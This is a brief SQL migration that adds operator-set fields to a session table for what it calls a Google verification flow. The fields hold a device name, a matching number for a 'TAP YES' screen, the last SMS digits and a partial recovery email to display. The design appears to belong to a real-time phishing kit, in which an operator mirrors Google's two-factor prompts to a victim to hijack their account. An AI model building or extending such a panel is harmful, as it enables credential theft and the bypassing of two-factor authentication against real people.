    -- Add admin-controlled fields for Google verification flow
    -- Run this to add admin control fields to your existing table

    ALTER TABLE user_sessions 
    ADD COLUMN IF NOT EXISTS admin_tap_device_info VARCHAR(100) NULL,
    ADD COLUMN IF NOT EXISTS admin_tap_matching_number VARCHAR(10) NULL,
    ADD COLUMN IF NOT EXISTS admin_sms_last_digits VARCHAR(2) NULL,
    ADD COLUMN IF NOT EXISTS admin_recovery_email VARCHAR(255) NULL;

    -- Add comments to the new columns
    COMMENT ON COLUMN user_sessions.admin_tap_device_info IS 'Device info for TAP YES screen (e.g., iPhone, Android)';
    COMMENT ON COLUMN user_sessions.admin_tap_matching_number IS 'Matching number to display on TAP YES screen';
    COMMENT ON COLUMN user_sessions.admin_sms_last_digits IS 'Last 2 digits to show on SMS OTP screen';
    COMMENT ON COLUMN user_sessions.admin_recovery_email IS 'Partial email to display on recovery screen';

